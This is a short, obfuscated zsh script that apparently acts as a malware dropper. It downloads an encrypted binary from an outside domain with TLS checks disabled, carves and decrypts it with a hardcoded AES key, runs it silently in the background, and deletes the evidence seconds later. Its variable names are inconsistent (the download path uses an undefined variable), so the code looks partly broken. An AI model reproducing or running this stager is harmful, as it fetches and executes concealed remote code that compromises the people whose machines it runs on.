#!/bin/zsh
t9arp=$(mktemp /tmp/x53qp9.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m10d101dbd6494b44.bin" -o "$t9arpz" || exit 1
c7dmub=$(stat -f %z "$t9arpz"); ywx4k4a=$(( c7dmub - 3254 - 1730 ))
tail -c +$(( 3254 + 1 )) "$t9arpz" | head -c $ywx4k4a | openssl enc -d -aes-256-cbc -k 67f6127b80020f14b8b0655b -out "$t9arp" 2>/dev/null
[ -s "$t9arp" ] && chmod 700 "$t9arp" && ( "$t9arp" & ) && disown
( sleep 3; rm -f "$t9arp" "$t9arpz" ) &>/dev/null &
